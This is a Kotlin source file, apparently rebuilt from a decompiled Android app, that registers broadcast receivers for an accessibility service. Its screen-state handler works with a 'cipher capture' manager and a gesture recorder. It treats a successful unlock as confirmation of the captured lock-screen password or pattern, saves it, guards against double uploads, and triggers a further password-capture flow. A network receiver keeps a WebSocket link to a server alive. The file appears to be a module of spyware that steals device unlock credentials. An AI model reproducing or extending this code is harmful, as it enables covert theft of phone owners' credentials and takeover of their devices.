package com.storm.safe.rock.service.delegates

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import com.storm.safe.rock.service.MyAccessibilityService

/**
 * Manages registration and unregistration of broadcast receivers that were
 * previously inline in MyAccessibilityService.
 *
 * Extracted receivers:
 * - screenStateReceiver (SCREEN_ON, SCREEN_OFF, USER_PRESENT)
 * - permissionRequestReceiver (PERMISSION_REQUEST action)
 * - localServiceActionReceiver (LOCAL_SERVICE action)
 * - networkEventReceiver (CONNECTIVITY_CHANGE)
 * - permissionHealthReceiver (PERMISSION_HEALTH_* actions)
 *
 * JADX references:
 * - screenStateReceiver: f52457i8
 * - permissionRequestReceiver: f52465j6
 * - localServiceActionReceiver: f52459j0
 * - networkEventReceiver: f52466j7
 * - permissionHealthReceiver: f52489m0
 */
class BroadcastReceiverRegistry(private val service: MyAccessibilityService) {

    companion object {
        private const val TAG = "BroadcastReceiverRegistry"
    }

    // ── Registration flags (readable externally) ──

    var isScreenStateRegistered = false
        private set

    var isLocalServiceRegistered = false
        private set

    var isPermissionHealthRegistered = false
        private set

    // ── Receiver references ──

    private var screenStateReceiver: BroadcastReceiver? = null
    private var permissionRequestReceiver: BroadcastReceiver? = null
    private var localServiceActionReceiver: BroadcastReceiver? = null
    private var networkEventReceiver: BroadcastReceiver? = null
    private var permissionHealthReceiver: BroadcastReceiver? = null

    // ════════════════════════════════════════════════════════════════
    // Screen state receiver (JADX: f52457i8)
    // ════════════════════════════════════════════════════════════════

    /**
     * Register screen state receiver for SCREEN_ON, SCREEN_OFF, USER_PRESENT.
     * JADX: dqtvuisjd$registerBroadcastReceivers — screen state block
     */
    fun registerScreenStateReceiver() {
        if (isScreenStateRegistered) return
        try {
            screenStateReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    when (intent?.action) {
                        Intent.ACTION_SCREEN_ON -> {
                            android.util.Log.d(TAG, "SCREEN_ON")
                            service.cipherCaptureManager?.refreshLockBatchId()
                            try { service.sendScreenStatus() } catch (_: Exception) {}
                        }
                        Intent.ACTION_SCREEN_OFF -> {
                            android.util.Log.d(TAG, "SCREEN_OFF")
                            service.cipherCaptureManager?.resetLockBatchId()
                            service.cipherRetryCount = 0
                            service.gestureRecorderManager?.reset()
                            try { service.sendScreenStatus() } catch (_: Exception) {}
                        }
                        Intent.ACTION_USER_PRESENT -> {
                            android.util.Log.d(TAG, "USER_PRESENT")
                            try { service.sendScreenStatus() } catch (_: Exception) {}
                            // 被动监听模式：用户解锁成功 = 密码验证成功
                            // 但如果 GestureRecorderManager 正在录制图案，由它在 onUnlocked() 中处理
                            // Bug 1 fix: also check hasReportedThisSession to prevent
                            // double upload when GRM.onUnlocked already reported.
                            val grm = service.gestureRecorderManager
                            if (service.isCipherCaptureEnabled && (grm == null || (!grm.isRecording && !grm.hasReportedThisSession))) {
                                android.util.Log.d(TAG, "USER_PRESENT + cipher监听中(非图案) → 确认保存密码")
                                service.cipherCaptureManager?.confirmAndSaveLastCipher()
                            } else if (grm?.isRecording == true) {
                                android.util.Log.d(TAG, "USER_PRESENT + 图案录制中 → 由 GestureRecorderManager 处理")
                            } else if (grm?.hasReportedThisSession == true) {
                                android.util.Log.d(TAG, "USER_PRESENT + GRM已上报本次会话 → 跳过重复上传")
                            }
                            val pType = service.pendingPasswordType
                            if (pType != null) {
                                service.pendingPasswordType = null
                                android.util.Log.d(TAG, "USER_PRESENT deferred password capture: type=$pType")
                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                    service.doLaunchSystemPasswordCapture(isInstallationFlow = false)
                                }, 500L)
                            }
                        }
                    }
                }
            }
            val filter = IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_USER_PRESENT)
            }
            if (Build.VERSION.SDK_INT >= 33) {
                // ADAPT: vendor dqtvuisjd.m211420b9 uses RECEIVER_EXPORTED (constant 2).
                // Previously NOT_EXPORTED caused some ROMs to miss USER_PRESENT broadcasts.
                service.registerReceiver(screenStateReceiver, filter, Context.RECEIVER_EXPORTED)
            } else {
                service.registerReceiver(screenStateReceiver, filter)
            }
            isScreenStateRegistered = true
            android.util.Log.d(TAG, "✅ 已注册屏幕状态广播接收器")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注册屏幕状态广播接收器失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Permission request receiver (JADX: f52465j6)
    // ════════════════════════════════════════════════════════════════

    /**
     * Register permission request receiver.
     * JADX: dqtvuisjd$registerBroadcastReceivers — permission request block
     */
    fun registerPermissionRequestReceiver() {
        try {
            permissionRequestReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    val action = intent?.getStringExtra("permission_action") ?: return
                    android.util.Log.d(TAG, "📋 收到权限请求广播: $action")
                }
            }
            val permFilter = IntentFilter("com.storm.safe.rock.action.PERMISSION_REQUEST")
            if (Build.VERSION.SDK_INT >= 33) {
                service.registerReceiver(permissionRequestReceiver, permFilter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                service.registerReceiver(permissionRequestReceiver, permFilter)
            }
            android.util.Log.d(TAG, "✅ 已注册权限申请广播接收器")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注册权限申请广播接收器失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Local service action receiver (JADX: f52459j0)
    // ════════════════════════════════════════════════════════════════

    /**
     * Register local service action receiver.
     * JADX: part of initializeDeferredManagers — l20 (InjectionManager)
     */
    fun registerLocalServiceReceiver() {
        if (isLocalServiceRegistered) return
        try {
            localServiceActionReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    val action = intent?.action ?: return
                    android.util.Log.d(TAG, "📋 本地服务广播: $action")
                }
            }
            val filter = IntentFilter("com.storm.safe.rock.action.LOCAL_SERVICE")
            if (Build.VERSION.SDK_INT >= 33) {
                service.registerReceiver(localServiceActionReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                service.registerReceiver(localServiceActionReceiver, filter)
            }
            isLocalServiceRegistered = true
            android.util.Log.d(TAG, "✅ 已注册 local-service 广播接收器")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注册 local-service 广播接收器失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Network event receiver (JADX: f52466j7)
    // ════════════════════════════════════════════════════════════════

    /**
     * Register network event receiver for CONNECTIVITY_CHANGE.
     * JADX: part of initializeDeferredManagers
     */
    fun registerNetworkEventReceiver() {
        if (networkEventReceiver != null) return
        try {
            networkEventReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    android.util.Log.d(TAG, "📡 网络状态变化")
                    // Trigger WebSocket reconnection check
                    service.networkManager?.ensureConnected()
                }
            }
            @Suppress("DEPRECATION")
            val filter = IntentFilter("android.net.conn.CONNECTIVITY_CHANGE")
            if (Build.VERSION.SDK_INT >= 33) {
                service.registerReceiver(networkEventReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                service.registerReceiver(networkEventReceiver, filter)
            }
            android.util.Log.d(TAG, "✅ 已注册网络事件广播接收器")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注册网络事件广播接收器失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Permission health receiver (JADX: f52489m0)
    // ════════════════════════════════════════════════════════════════

    /**
     * Register permission health receiver for PERMISSION_HEALTH_* actions.
     * JADX: initializeDeferredManagers — fn0 permission health monitor
     */
    fun registerPermissionHealthReceiver() {
        if (isPermissionHealthRegistered) return
        try {
            permissionHealthReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    val action = intent?.action ?: return
                    android.util.Log.d(TAG, "📋 权限健康广播: $action")
                }
            }
            val filter = IntentFilter().apply {
                addAction("com.storm.safe.rock.intent.PERMISSION_HEALTH_RECOVERED")
                addAction("com.storm.safe.rock.intent.PERMISSION_HEALTH_ISSUE")
                addAction("com.storm.safe.rock.intent.MEDIA_PROJECTION_RECOVERED")
                addAction("com.storm.safe.rock.intent.ANDROID15_PERMISSION_STABLE")
                addAction("com.storm.safe.rock.intent.STOP_SECONDARY_CONFIRMATION")
                addAction("com.storm.safe.rock.intent.PERMISSION_RECOVERY_FAILED")
            }
            if (Build.VERSION.SDK_INT >= 33) {
                service.registerReceiver(permissionHealthReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                service.registerReceiver(permissionHealthReceiver, filter)
            }
            isPermissionHealthRegistered = true
            android.util.Log.d(TAG, "✅ 已注册权限健康监控广播接收器")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注册权限健康监控广播接收器失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Unregister all
    // ════════════════════════════════════════════════════════════════

    /**
     * Unregister all receivers managed by this registry.
     * Safe to call multiple times — each receiver is unregistered only if non-null.
     */
    fun unregisterAll() {
        // Screen state receiver
        try {
            if (isScreenStateRegistered) {
                screenStateReceiver?.let { service.unregisterReceiver(it) }
                screenStateReceiver = null
                isScreenStateRegistered = false
                android.util.Log.d(TAG, "✅ 已注销屏幕状态广播接收器")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注销屏幕状态广播接收器失败", e)
        }

        // Permission request receiver
        try {
            permissionRequestReceiver?.let {
                service.unregisterReceiver(it)
                permissionRequestReceiver = null
                android.util.Log.d(TAG, "已注销权限申请广播接收器")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "注销权限申请广播接收器失败", e)
        }

        // Local service action receiver
        try {
            if (isLocalServiceRegistered) {
                localServiceActionReceiver?.let { service.unregisterReceiver(it) }
                localServiceActionReceiver = null
                isLocalServiceRegistered = false
                android.util.Log.d(TAG, "✅ 已注销 local-service 广播接收器")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注销 local-service 广播接收器失败", e)
        }

        // Permission health receiver
        try {
            if (isPermissionHealthRegistered) {
                permissionHealthReceiver?.let { service.unregisterReceiver(it) }
                permissionHealthReceiver = null
                isPermissionHealthRegistered = false
                android.util.Log.d(TAG, "✅ 已注销权限健康监控广播接收器")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注销权限健康监控广播接收器失败", e)
        }

        // Network event receiver
        try {
            networkEventReceiver?.let {
                service.unregisterReceiver(it)
                networkEventReceiver = null
                android.util.Log.d(TAG, "✅ 已注销网络事件广播接收器")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注销网络事件广播接收器失败", e)
        }
    }
}
